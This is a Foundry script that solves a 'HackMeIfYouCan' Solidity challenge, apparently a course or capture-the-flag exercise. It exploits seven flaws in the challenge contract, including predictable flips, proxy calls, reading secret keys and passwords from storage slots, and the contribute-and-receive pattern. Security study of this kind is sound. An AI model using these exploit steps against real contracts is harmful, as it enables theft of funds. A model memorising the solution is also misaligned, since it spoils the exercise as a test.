// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "../src/Contract.sol";
import "../src/Proxy.sol";
import "../src/Building.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract HackMeIfYouCanSolution is Script {
    HackMeIfYouCan public hackMeIfYouCan;
    Proxy public proxy;
    BuildingContract public building;

    function run() external {
        uint256 id;
        assembly {
            id := chainid()
        }
        if (id == 11155111) {
            hackMeIfYouCan = HackMeIfYouCan(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9);
        } else {
            console.log("Deploying contract...");
            bytes32[15] memory data;
            for (uint256 i = 0; i < 15; i++) {
                bytes32 value = bytes32(uint256(i));
                data[i] = value;
            }
            hackMeIfYouCan = new HackMeIfYouCan(bytes32(uint256(100)), data);
            vm.stopBroadcast();
        }
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Deploying proxy contract... \n");
        proxy = new Proxy(address(hackMeIfYouCan));

        console.log("Deploying building contract... \n");
        building = new BuildingContract(address(hackMeIfYouCan));

        console.log("Solving function 1 : flip");
        hackMeIfYouCan.flip(false);
        // vm.roll(block.number + 1);
        console.log('Marks (supposed to be 4):', hackMeIfYouCan.getMarks(vm.envAddress("PUBLIC_KEY")), "\n");

        console.log("Solving function 2 : addPoint");
        proxy.callAddPoint();
        console.log('Marks (supposed to be 5):', hackMeIfYouCan.getMarks(vm.envAddress("PUBLIC_KEY")), "\n");

        console.log("Solving function 3 : transfer");
        hackMeIfYouCan.transfer(address(0), 1);
        console.log('Marks (supposed to be 6):', hackMeIfYouCan.getMarks(vm.envAddress("PUBLIC_KEY")), "\n");

        console.log("Solving function 4 : goTo");
        building.hack();
        console.log('Marks (supposed to be 10):', hackMeIfYouCan.getMarks(vm.envAddress("PUBLIC_KEY")));

        console.log("Solving function 5 : sendKey");
        bytes32 data = vm.load(address(hackMeIfYouCan), bytes32(uint256(16)));
        hackMeIfYouCan.sendKey(bytes16(data));
        console.log('Marks (supposed to be 14):', hackMeIfYouCan.getMarks(vm.envAddress("PUBLIC_KEY")), "\n");

        console.log("Solving function 6 : sendPassword");
        data = vm.load(address(hackMeIfYouCan), bytes32(uint256(3)));
        hackMeIfYouCan.sendPassword(data);
        console.log('Marks (supposed to be 17):', hackMeIfYouCan.getMarks(vm.envAddress("PUBLIC_KEY")), "\n");

        console.log("Solving function 7 : receive");
        hackMeIfYouCan.contribute{value: 0.00099 ether}();
        address(hackMeIfYouCan).call{value: 0.001 ether}("");
        console.log('Marks (supposed to be 20):', hackMeIfYouCan.getMarks(vm.envAddress("PUBLIC_KEY")), "\n");
    }
}